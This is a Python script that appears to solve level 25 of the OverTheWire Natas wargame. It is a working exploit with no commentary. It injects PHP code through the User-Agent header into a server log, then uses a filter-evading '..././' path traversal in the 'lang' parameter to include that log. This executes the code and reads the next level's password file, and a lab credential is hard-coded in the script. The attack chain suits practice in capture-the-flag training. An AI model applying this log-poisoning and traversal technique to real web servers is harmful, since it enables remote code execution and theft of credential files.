#!/usr/bin/env python
import requests

auth = ('natas25', 'GHF6X7YwACaYYssHVY05cFq83hRktl4c')

headers = {'User-Agent': '<?php echo file_get_contents("/etc/natas_webpass/natas26") ?>'}

s = requests.Session()
s.cookies.set('PHPSESSID', 'nxvl-pwnd')
lang='..././..././..././..././..././var/www/natas/natas25/logs/natas25_nxvl-pwnd.log'

r = s.get('http://natas25.natas.labs.overthewire.org/?lang=%s' % lang, auth=auth, headers=headers)
print r.text
